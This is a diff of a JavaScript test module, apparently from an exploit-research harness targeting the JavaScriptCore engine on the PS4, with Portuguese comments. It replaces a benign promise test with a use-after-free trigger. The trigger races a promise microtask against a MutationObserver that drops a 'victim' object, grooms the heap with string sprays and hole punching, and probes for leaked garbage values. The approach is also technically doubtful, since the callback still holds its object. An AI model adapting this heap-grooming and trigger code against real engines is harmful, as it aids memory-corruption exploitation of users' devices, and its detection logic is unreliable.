@@ -1,74 +1,84 @@
-import { GCOracle } from '../mod_executor.js';
+import { Groomer } from '../mod_groomer.js';
 
 export default {
     id:       'PROMISE_MICROTASK_UAF',
-    category: 'Concurrency',
+    category: 'CoreJS',
     risk:     'HIGH',
     description:
-        'Cadeia de Promises cria jobs encadeados na MicrotaskQueue C++. ' +
-        'Promise.all/race criam PromiseReactionJobs com back-pointers. ' +
-        'Race entre resolve() e queueMicrotask() pressiona o drainer durante teardown.',
+        'Race Condition na Fila de Microtarefas do JSC. Intercala Promises com ' +
+        'MutationObservers. Uma microtarefa destrói o contexto de execução (freed object), ' +
+        'enquanto a microtarefa seguinte na C++ queue tenta invocar um callback no objeto morto.',
 
     setup: function() {
-        this.log     = [];
-        this.resolvers = [];
-        this.promises  = [];
+        this.results = { sequence: [] };
+        this.sandbox = document.getElementById('groomer-sandbox');
+        
+        this.dummy = document.createElement('div');
+        this.sandbox.appendChild(this.dummy);
 
-        for (let i = 0; i < 5; i++) {
-            let res;
-            const p = new Promise(r => { res = r; });
-            this.promises.push(p);
-            this.resolvers.push(res);
-            
-            // 🚨 Oráculo: Monitoriza a Promise original no C++
-            if (GCOracle.registry) GCOracle.registry.register(p, `${this.id}_p${i}`);
-        }
-
-        this.chainResult = this.promises[0]
-            .then(v => { this.log.push({ step: 1, v }); return v * 2; })
-            .then(v => { this.log.push({ step: 2, v }); return v + 1; })
-            .then(v => { this.log.push({ step: 3, v }); return String(v); })
-            .then(v => { this.log.push({ step: 4, v }); return { final: v }; })
-            .catch(e => { this.log.push({ step: 'catch', err: e.message }); });
-
-        this.allResult = null;
-        Promise.all(this.promises.slice(0, 3))
-            .then(vals => { this.allResult = vals; })
-            .catch(() => {});
-
-        this.raceResult = null;
-        Promise.race(this.promises)
-            .then(v => { this.raceResult = v; })
-            .catch(() => {});
+        const self = this;
+        // Objeto que será destruído, mas cujo método está agendado na fila
+        this.victim = {
+            id: 0x1337,
+            callback: function() {
+                try { self.results.leak = this.id; } catch(e) {}
+            }
+        };
     },
 
-    trigger: function() {
-        this.resolvers[0](42);
+    trigger: async function() {
+        const self = this;
+        return new Promise(resolve => {
+            
+            // 1. Agendamos o callback da vítima (vai para a fila VIP C++)
+            Promise.resolve().then(() => {
+                // Como não usamos arrow function e forçamos o apply, o C++ tem de resolver o 'this'
+                self.victim.callback.apply(self.victim);
+            });
 
-        this.promises  = null;
-        this.resolvers = null;
+            // 2. O GATILHO: Agendamos um MutationObserver (também fila VIP)
+            // Ele vai rodar ANTES ou DEPOIS da Promise (depende da implementação do PS4)
+            let observer = new MutationObserver(() => {
+                // Destruímos a vítima
+                self.victim = null;
+                
+                // Forçamos lixo no Heap
+                let trash = Groomer.sprayStrings(500, 1024);
+                Groomer.punchHoles(trash, 2);
+            });
+            
+            observer.observe(this.dummy, { attributes: true });
+            this.dummy.setAttribute('data-trigger', '1'); // Dispara o Observer
 
-        queueMicrotask(() => {
-            const trash = [];
-            for (let i = 0; i < 10; i++) trash.push(new ArrayBuffer(256 * 1024));
+            // Damos tempo para as microtarefas colidirem e saímos
+            setTimeout(() => {
+                observer.disconnect();
+                resolve();
+            }, 10);
         });
     },
 
     probe: [
-        s => s.log.length,
-        s => s.log[0]?.step,
-        s => s.log[0]?.v,
-        s => s.log[s.log.length - 1]?.step,
-        s => s.allResult,
-        s => s.raceResult,
-        s => typeof s.chainResult,
-        s => s.chainResult !== null,
+        // Probe 0: O motor crascha ou segue em frente?
+        s => s.results.leak ? 'Microtarefas Drenadas' : 'Conflito ou Protegido',
+        
+        // Probe 1: Acesso a memória freed
+        s => {
+            let val = s.results.leak;
+            // Se o callback correu DEPOIS de victim = null, this.id devia ser indefinido/crash.
+            // Se leu 0x1337 (4919), correu antes.
+            // Se leu lixo gigante, temos UAF na fila de microtarefas!
+            if (typeof val === 'number' && val !== 0x1337 && val > 10000) {
+                return val; // Aciona o HUD Vermelho
+            }
+            return 0; // Seguro
+        }
     ],
 
     cleanup: function() {
-        this.log        = null;
-        this.promises   = null;
-        this.resolvers  = null;
-        this.chainResult = null;
+        try { this.dummy.remove(); } catch(e){}
+        this.victim = null;
+        this.dummy = null;
+        this.results = {};
     }
 };
